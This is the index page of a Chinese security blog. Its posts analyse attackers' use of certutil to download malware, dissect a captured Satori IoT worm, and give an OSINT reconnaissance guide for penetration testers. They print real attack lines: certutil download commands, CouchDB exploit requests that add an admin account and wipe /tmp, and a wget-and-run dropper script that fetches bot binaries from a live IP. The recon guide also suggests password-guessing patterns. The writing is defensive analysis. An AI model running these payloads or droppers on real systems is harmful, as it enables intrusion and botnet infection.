<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SY0U&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一半技术 一半生活">
<meta property="og:type" content="website">
<meta property="og:title" content="SY0U&#39;s Blog">
<meta property="og:url" content="http://wsygoogol.github.io/index.html">
<meta property="og:site_name" content="SY0U&#39;s Blog">
<meta property="og:description" content="一半技术 一半生活">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SY0U&#39;s Blog">
<meta name="twitter:description" content="一半技术 一半生活">
  
    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">SY0U&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-About-the-Blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/08/About-the-Blog/" class="article-date">
  <time datetime="2016-06-08T10:54:05.000Z" itemprop="datePublished">2016-06-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/08/About-the-Blog/">About the Blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjprzgec8000psg9loumdcsei" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-攻击者利用CertUtil-exe植入恶意软件" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/" class="article-date">
  <time datetime="2018-12-17T03:08:27.000Z" itemprop="datePublished">2018-12-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/">攻击者利用CertUtil.exe植入恶意软件</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="0x00-CertUtil-exe-是什么"><a href="#0x00-CertUtil-exe-是什么" class="headerlink" title="0x00 CertUtil.exe 是什么"></a>0x00 CertUtil.exe 是什么</h4><p>近期通过蜜罐捕获了多起通过CertUtil植入恶意软件的攻击，所以对这个工具进行了一些简单的研究。</p>
<p>CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。</p>
<h4 id="0x01-CertUtil怎么用"><a href="#0x01-CertUtil怎么用" class="headerlink" title="0x01 CertUtil怎么用"></a>0x01 CertUtil怎么用</h4><p>CertUtil的经典用法是处理Base64编码数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Temp&gt; certutil.exe -decode input.txt output.exe</div></pre></td></tr></table></figure>
<p>CertUtil能够从远程URL下载证书或任何其他文件,语法： “certutil.exe -urlcache -split -f [URL] output.file”</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">certutil.exe -urlcache -split -f http://37.44.212.223/miner.exe C:/Windows/temp/yete.exe</div></pre></td></tr></table></figure>
<ul>
<li>“-urlcache”用于执行URL缓存管理操作。</li>
<li>“-f”用于强制获取指定的URL并更新缓存。</li>
<li>“-split”用于将文件转储到磁盘上。  </li>
</ul>
<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-2.png" alt="cert-2"></p>
<p>分析中发现certutil.exe的强大之处是处理Base64编码数据：首先对恶意文件进行base64编码，以绕过入侵检测系统， 然后在使用CertUtil.exe下载后再对其进行解码。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Temp&gt;certutil.exe -urlcache -split -f <span class="string">"https://hackers.home/badcontent.txt"</span> bad.txt</div><div class="line">C:\Windows\Temp&gt;certutil.exe -decode bad.txt bad.exe</div></pre></td></tr></table></figure>
<p>攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。</p>
<h4 id="0x02-流量分析"><a href="#0x02-流量分析" class="headerlink" title="0x02 流量分析"></a>0x02 流量分析</h4><p>分析的过程中还发现这个工具使用连个不同的User-Agents（“Microsoft-CryptoAPI/6.1”和“CertUtil URL Agent”）与远程服务器建立两个会话连接，且response包内容一致，以下是抓包对比：</p>
<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-3.png" alt="cert-3"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/" data-id="cjprzgecv001csg9l23aneftc" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Satori-物联网蠕虫分析" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/17/Satori-物联网蠕虫分析/" class="article-date">
  <time datetime="2018-09-17T09:50:48.000Z" itemprop="datePublished">2018-09-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/17/Satori-物联网蠕虫分析/">Satori 物联网蠕虫分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="0x00-样本植入"><a href="#0x00-样本植入" class="headerlink" title="0x00 样本植入"></a>0x00 样本植入</h4><p>​    我们通过高交互蜜罐捕获到Satori 变种物联网蠕虫样本，Satori是一个Mirai的变种，主要是利用物联网设备的漏洞进行传播，本次捕获的样本利用了4个路由器漏洞：</p>
<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/hdr.png" alt="hdr"></p>
<p>​    攻击者利用couchdb权限提升漏洞和couchdb远程命令执行漏洞向蜜罐系统植入了一个shell脚本，执行shell脚本下载样本并执行。</p>
<p>payload如下：</p>
<p>添加admin帐户，password：guest</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PUT /_users/org.couchdb.user:guest HTTP/1.1</div><div class="line"></div><div class="line">&#123;<span class="string">"type"</span>: <span class="string">"user"</span>, <span class="string">"name"</span>: <span class="string">"guest"</span>, <span class="string">"roles"</span>: [<span class="string">"_admin"</span>], <span class="string">"roles"</span>: [],<span class="string">"password"</span>: <span class="string">"guest"</span>&#125;</div></pre></td></tr></table></figure>
<p>清空/tmp目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PUT /_config/query_servers/cmd HTTP/1.1</div><div class="line"><span class="string">"rm -rf /tmp/*"</span></div></pre></td></tr></table></figure>
<p>wget下载shell脚本cch到/tmp目录并执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PUT /_users/org.couchdb.user:guest HTTP/1.1</div><div class="line">wget http://148.72.176.78/cch -O /tmp/cch</div><div class="line">PUT /_config/query_servers/cmd HTTP/1.1</div><div class="line">sh /tmp/cch</div></pre></td></tr></table></figure>
<p>cch的内容如下,功能就是从服务器”148.72.176.78”下载样本ken.x86，并执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">n=<span class="string">"ken.x86"</span></div><div class="line">http_server=<span class="string">"148.72.176.78"</span></div><div class="line"><span class="built_in">dirs</span>=<span class="string">"/tmp/ /dev/ /dev/shm/ /var/ /var/run/ /var/tmp/"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> dir <span class="keyword">in</span> <span class="variable">$dirs</span></div><div class="line"><span class="keyword">do</span></div><div class="line"> &gt;<span class="variable">$dir</span>.file &amp;&amp; <span class="built_in">cd</span> <span class="variable">$dir</span></div><div class="line"><span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$n</span></div><div class="line"><span class="keyword">do</span></div><div class="line"> cp <span class="variable">$SHELL</span> <span class="variable">$i</span></div><div class="line"> &gt;<span class="variable">$i</span></div><div class="line"> chmod 777 <span class="variable">$i</span></div><div class="line"> wget http://<span class="variable">$http_server</span>/<span class="variable">$i</span> -O- &gt;<span class="variable">$i</span> || curl -O http://<span class="variable">$http_server</span>/$</div><div class="line"> chmod 777 <span class="variable">$i</span></div><div class="line"> ./<span class="variable">$i</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<h4 id="0x01-样本分析"><a href="#0x01-样本分析" class="headerlink" title="0x01 样本分析"></a>0x01 样本分析</h4><p>​    样本利用了4个路由器漏洞：<a href="https://www.exploit-db.com/exploits/43414/" target="_blank" rel="external">Huawei Router HG532命令执行漏洞</a>，<a href="https://www.exploit-db.com/exploits/44760/" target="_blank" rel="external">D-Link DSL-2750B OS命令注入漏洞</a>,<a href="https://www.exploit-db.com/exploits/37171/" target="_blank" rel="external">D-Link Devices HNAP SOAPAction-Header命令注入漏洞</a>,<a href="https://www.exploit-db.com/exploits/37169/" target="_blank" rel="external">Realtek SDK Miniigd UPnP SOAP命令执行漏洞</a>。这四个漏洞在之前捕获的Mirai和Satori样本中均出现过，利用的非常多。</p>
<p>下面对Huawei Router HG532命令执行漏洞的利用过程进行分析.</p>
<p>1.创建子进程，通过util_local_addr()获取本地IP地址：</p>
<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/huawei_1.png" alt="huawei_1"></p>
<p>2.设置原始套接字，失败则退出：</p>
<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/huawei_3.png" alt="huawei_3"></p>
<p>3.设置IPv4的报文头部，tcph_0-&gt;dest为目的端口：37215，tcph-&gt;source为源端口。 </p>
<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_6.png" alt="huawei_6"></p>
<p>4.通过huaweiscanner_get_random_ip()函数随机生成IP地址,通过sendto()函数向对应IP的37215端口发送数据包</p>
<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei5.png" alt="huawei5"></p>
<p>5.扫描到开放37215端口的主机后尝试使用payload建立连接，执行wget命令从指定服务器IP:148.72.176.78中下载恶意文件。</p>
<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei.png" alt="huawei"></p>
<p>​    其他三个漏洞的利用过程与上面的过程基本相同，只是换了对应的端口和payload：</p>
<p>D-Link Devices HNAP SOAPAction-Header命令注入漏洞，攻击8081端口，payload如下：</p>
<p><img src="D:\gitBlog\themes\landscape\source\upload_image\hnap.png" alt="hnap"></p>
<p>D-Link DSL-2750B OS命令注入漏洞，攻击80和8080端口，payload如下：</p>
<p><img src="D:\gitBlog\themes\landscape\source\upload_image\dlink.png" alt="dlink"></p>
<p>Realtek SDK Miniigd UPnP SOAP命令执行漏洞，攻击52869端口，payload如下：</p>
<p><img src="D:\gitBlog\themes\landscape\source\upload_image\rrr.png" alt="rrr"></p>
<p>​    通过与Mirai的对比分析发现，这个样本的攻击过程与Mirai几乎一致，具有同源性，确定为Mirai变种。均是通过随机生成ip地址扫描特定的端口，Mirai扫描23端口，该样本扫描8081（Hnap）、80和8080（Dlink）、52869(Realtek)、37215（Huawei）。发现主机后，Mirai是尝试弱口令通过telnet进行登陆，而这个样本则是通过相应的payload尝试从指定主机中下载感染bot程序进行感染。 </p>
<p>​    由于Mirai 的源码已经在网上公开，改造 Mirai ，以其变种身份形式出现，构造巨大的僵尸网络早已不是难事。这也是为什么自Mirai后，发现了大量Mirai变种形成的僵尸网络。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/09/17/Satori-物联网蠕虫分析/" data-id="cjprzgeci000ysg9lhko09lgf" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Suricata-tips" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/Suricata-tips/" class="article-date">
  <time datetime="2018-09-14T06:47:51.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/Suricata-tips/">Suricata tips</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><p><a href="https://blog.rapid7.com/2017/02/14/how-to-install-suricata-nids-on-ubuntu-linux/" target="_blank" rel="external">https://blog.rapid7.com/2017/02/14/how-to-install-suricata-nids-on-ubuntu-linux/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/09/14/Suricata-tips/" data-id="cjprzgeck0011sg9ljqbu2vie" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-开源情报收集" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/11/开源情报收集/" class="article-date">
  <time datetime="2018-09-11T01:27:51.000Z" itemprop="datePublished">2018-09-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/11/开源情报收集/">开源情报收集</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>​    渗透测试总是需要从广泛的信息收集阶段开始。 本文讨论了如何使用Internet上的开源信息来构建目标的概要。 收集的数据可用于识别服务器，域，版本号，漏洞，错误配置，可利用的端点和敏感信息泄漏。</p>
<p>​    通过开源情报收集技术可以发现大量数据，特别是对于拥有大量在线业务的公司。 总有一些微小的代码，一个技术论坛问题，精心设计的细节，一个长期被遗忘的子域，甚至包含可以用于目标站点的数据的营销材料的PDF。 即使简单的谷歌搜索通常也会产生有趣的结果。 以下是我们拥有客户端（域）名称（无特定顺序）后所做的一些事情：</p>
<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>​    Whois查找以查找管理员电子邮件地址。 这些电子邮件地址通常也作为应用程序上的有效用户存在。 可以通过数据库泄漏或通过HaveIBeenPwned(<a href="https://haveibeenpwned.com/)等搜索服务搜索电子邮件地址，该服务会告诉您是否发现您的电子邮件是违规行为的一部分。![img](https://cdn-images-1.medium.com/max/1000/1*j75XCqSNPVzp9y8GAYxTyA.png" target="_blank" rel="external">https://haveibeenpwned.com/)等搜索服务搜索电子邮件地址，该服务会告诉您是否发现您的电子邮件是违规行为的一部分。![img](https://cdn-images-1.medium.com/max/1000/1*j75XCqSNPVzp9y8GAYxTyA.png</a>)</p>
<p>​    除了电子邮件地址，whois查询还可以IP历史信息，域过期日期甚至电话号码,这些可以在社会工程学中得到应用。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*1HByjz1nYKKi4s3EuAhV_g.png" alt="img"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>​    使用site 运算符的Google高级搜索，来限制目标网站，查找php（或任何服务端脚本文件类型），txt或者log文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.example.org ext:php | ext:txt | ext:<span class="built_in">log</span></div></pre></td></tr></table></figure>
<p>​    我们曾多次使用类似搜索查询识别出包含敏感信息和应用程序完整系统路径的有趣文件（例如日志文件）。 您可以将此查询与减号运算符结合来排除特定搜索结果。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*pOtl_CjECSnkkGBJxC6YsA.png" alt="img"></p>
<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>​    对域（和子域）执行搜索， 文件类型包括PDF，Excel，Word和PowerPoint。 这些文档可能包含可用于其他攻击的信息。 通常，文件中包含的文档数据（作者姓名等）可以用作应用程序本身的有效用户名。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.example.org ext:pdf | ext:doc| ext:docx | ext:ppt | ext:pptx | ext:xls | ext:xlsx | ext:csv</div></pre></td></tr></table></figure>
<p>您可以在本地下载这些文件，并通过文档元数据提取程序运行它们，或查看每个文件的属性,查看泄漏的信息。</p>
<p>要查看可用于搜索数据的所有选项，请参阅<a href="https://www.google.co.in/advanced_search。" target="_blank" rel="external">https://www.google.co.in/advanced_search。</a> 此外，<a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="external">Google Hacking Database</a>(现在在exploit-db上)允许您使用预先制作的查询来搜索Internet上特定和有趣的内容。 </p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*QJiz9QCCagjYI0Ak9yg7NQ.png" alt="img"></p>
<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>​    检查robots.txt文件中隐藏的有趣目录。 大多数框架和内容管理系统都有明确定义的目录结构。 所以admin目录是/admin或/administration请求。 如果没有，robots.txt很可能包含您寻找的目录名称。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*cfw6vicXCwQc1xh5PlZz_g.png" alt="img"></p>
<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>​    浏览HTML源代码以识别/CMS/框架等。识别应用程序类型有助于将攻击集中在具有易受攻击的组件（例如插件和主题）。 例如，如果您查看页面源并查看wp-content，那么您可以确定您正在浏览WordPress站点。</p>
<p>​    许多公开可用的浏览器插件也可用于识别网站框架。 Firefox上的Wappalyzer在识别网站上的几种不同服务器类型，服务器和客户端框架以及第三方插件方面做得非常出色。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*LLK4o3wfggc_zvHYhLDYSA.png" alt="img"></p>
<h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>​    通常情况下，如果您正在查看的网站是由第三方供应商创建的，那么您很可能会在主页底部的某处看到“Powered by Third-Party-Developer-Company”。</p>
<p>​    使用它来跟踪您收集到承包商网站的信息，也可以获得令人难以置信的回报。 浏览它可能会得到它们构建的框架类型和版本号。 作为其开发计划的一部分，承包商很可能在您客户的网站上拥有测试/管理员帐户。</p>
<p>​    根据我的经验，许多网站管理员/开发人员经常使用的密码是公司名称（客户公司或承包商的公司）的变体，最后是一些带/不带特殊字符的数字。 例如，如果承包商公司被称为“示例开发人员”，则001Example，Example001,00example，example00等是在客户网站的登录面板上尝试的良好密码候选者。</p>
<h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>​    查看公司的LinkedIn个人资料，以确定高级经理，董事和非技术人员。 很多时候，最薄弱的密码属于许多公司的管理人员。 搜索公司网站上的“关于我们”页面也可以找到薄弱的目标。</p>
<p>​    基于一些电子邮件，可以推测出用户名的标准格式。 一旦理解了用户名格式，就可以创建一个电子邮件地址h和用户名列表，然后可以用它们来执行其他攻击，包括登录页面的暴力破解甚至利用弱密码重置功能。 </p>
<h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>​    执行与IP地址相关的检查。 由于托管在同一IP（共享主机）上的应用程序不同且较弱，因此应用程序通常会受到攻击。 使用反向IP查找，您可以识别其他目标。 Bing使用IP进行搜索的功能很强大。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*Dtm_iquz8ORZ5XF52dKIyQ.png" alt="img"></p>
<p>反向查找工具：<a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="external">you get signal</a> 和 <a href="https://www.ip-address.org/reverse-lookup/reverse-ip.php" target="_blank" rel="external">IP Address</a></p>
<p>​    作为使用IP地址进行检查的一部分，还必须注意域名的A和PTR记录。有时由于配置错误，在使用PTR或站点的A记录时可能会访问其他站点。 可以使用nslookup或dig命令获取此信息 :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dig -x 8.8.8.8 </div><div class="line">nslookup 8.8.8.8</div></pre></td></tr></table></figure>
<h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>​    子域名枚举，以找到客户端托管基础架构较弱的入口点。 子域枚举是评估和发现客户在线公开的资产的最重要步骤之一; 故意作为其业务的一部分或由于配置错误而意外发生。</p>
<p>​    子域名枚举可以使用各种工具完成，例如dnsrecon，subbrute，knock.py，使用Google的site操作符或dnsdumpster甚至virustotal.com等网站。 大多数这些工具使用大型常用描述性词典，如<em>admin, pages, people, hr, downloads, blog, dev</em> 等。这些单词附加到主域 - example.org，以创建可能的子列表 域名，如admin.example.org，pages.example.org，people.example.org等。然后可以针对DNS服务器检查这些名称验证条目是否存在。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*xSFqM6qaDY6f5d5hddhALw.png" alt="img"></p>
<h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><p>​    查找不同类型资源请求的HTTP状态代码和响应标头。 对于有效页面，对于非现有页面，对于重定向的页面，对于目录名称等。在响应头中查找细微的拼写错误，额外空格和冗余值。</p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*H8zBQkiUGzTud1RRTRTKNA.png" alt="img"></p>
<p>一个非常巧妙的X-Frame-Options标题。标题开头的额外空格使标题本身无效。 </p>
<p>​    另外，请注意<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="external">CSP头</a>。 它们包含允许脚本加载的域名和来源。 有时，CSP标头中列出的域名中的拼写错误或托管CDN的不安全JavaScript可能是您执行XSS有效负载的唯一方法:)</p>
<h4 id="11"><a href="#11" class="headerlink" title="11"></a>11</h4><p>通过Shodan和Censys搜索客户端的域名，以查找文件，IP地址，公开的服务和错误消息。 Shodan和censys扫描了互联网，列举了服务并对他们的调查结果进行了分类，使他们能够通过简单的关键字进行搜索。 这两项服务都可以用来发现大量有趣的东西，包括开放式摄像机，思科设备，医院设施管理服务器，弱配置的telnet和snmp服务以及SCADA系统。 过去曾使用Censys来查找托管源代码和完整应用程序的整个docker镜像的有趣端点。</p>
<h4 id="12"><a href="#12" class="headerlink" title="12"></a>12</h4><p>​    在github，gitlab，bitbucket等代码托管服务上查找客户端。通过可搜索的存储库在线托管的代码中可以找到各种有趣的东西，包括Web漏洞，Web应用程序中的0days，配置问题，AWS和其他密钥。</p>
<p>​    开发人员经常使用生产密码或API访问密钥提交代码，以便稍后实现和删除敏感信息并进行其他提交。 但是，使用提交日志并检出特定提交，可以检索这些敏感信息，然后可以使用这些信息对客户端的托管基础架构发起完全攻击。</p>
<p>​    像Gitrob这样的工具可用于查询Github并从命令行本身搜索特定组织的敏感文件。</p>
<h4 id="13"><a href="#13" class="headerlink" title="13"></a>13</h4><p>​    浏览网站的HTML源，以确定客户端是否在云上托管任何静态内容。 像image，js和css文件这样的内容可能托管在客户端拥有的s3数据库上。 在执行标准侦察时也可以识别客户端是否使用云下文来托管静态/动态内容。 在这种情况下，如果客户端在数据库上配置了错误的配置，那么查找客户端使用的数据库可能会非常有益。 在面向公众的数据库中可以找到大量有趣的信息。</p>
<p>​    像DigiNinja的Bucket Finder这样的工具可用于通过数据库的名称来自动化搜索过程。此工具需要精心策划的存储桶名称列表和潜在的完整URL才能生效。 </p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*I-UpzxJV6OgLbh4FGgopQg.png" alt="img"></p>
<p><img src="https://cdn-images-1.medium.com/max/1200/1*2hv9j6-GPGR9JuMMkwETYw.png" alt="img"></p>
<p>​    有各种类型的数据可以归类为OSINT数据，但从渗透测试者的角度来看，所有这些数据都不重要。 作为渗透测试人员，我们或多或少对以下类别的信息感兴趣 ：</p>
<p>1.增加攻击面（域，网块等）的信息<br>2.凭据（电子邮件地址，用户名，密码，API密钥等）<br>3.敏感信息（客户详细信息，财务报告等）<br>4.基础设施细节（技术堆栈，使用的硬件设备等）</p>
<p>开源情报（OSINT）是从公开来源收集到数据。</p>
<h3 id="12-种-OSINT-信息收集技巧"><a href="#12-种-OSINT-信息收集技巧" class="headerlink" title="12 种 OSINT 信息收集技巧"></a>12 种 OSINT 信息收集技巧</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>SSL/TLS证书具有丰富的信息，这些信息在安全评估期间非常重要。</p>
<p>SSL / TLS证书通常包含域名，子域名和电子邮件地址。这使他们成为攻击者的宝库。 </p>
<h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>WHOIS服务通常在渗透测试期间用于查询与Internet资源的注册用户相关的信息，例如域名或IP地址（块）。 WHOIS枚举对于在互联网上拥有大量存在的目标组织尤其有效。</p>
<p>一些公共WHOIS服务器支持高级查询，我们可以使用这些查询来收集目标组织的各种信息。 </p>
<p>让我们看一些先进的WHOIS查询来收集信息:</p>
<p>我们可以查询ARIN WHOIS服务器以返回具有给定域名的电子邮件地址的所有条目，在本例中为icann.org。我们只从结果中提取电子邮件地址。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -h whois.arin.net <span class="string">"e @ icann.org"</span> | grep -E -o <span class="string">"\b[a-zA-Z0-9.-]+@[a-zA-Z0–9.-]+\.[a-zA-Z0–9.-]+\b"</span> | uniq</div></pre></td></tr></table></figure>
<p>我们可以查询RADB WHOIS服务器以返回属于自治系统号（ASN）的所有网段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -h whois.radb.net -- <span class="string">'-i origin AS111111'</span> | grep -Eo <span class="string">"([0-9.]+)&#123;4&#125;/[0-9]+"</span> | uniq</div></pre></td></tr></table></figure>
<p>我们可以查询ARIN WHOIS服务器以返回给定关键字的所有POC，ASN，组织和最终用户客户。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -h whois.arin.net <span class="string">"z wikimedia"</span></div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/09/11/开源情报收集/" data-id="cjprzgect001asg9lac0ob8qv" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-构建SOC的机器学习分析模型" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/06/构建SOC的机器学习分析模型/" class="article-date">
  <time datetime="2018-09-06T01:47:45.000Z" itemprop="datePublished">2018-09-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/06/构建SOC的机器学习分析模型/">构建SOC的机器学习分析模型</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
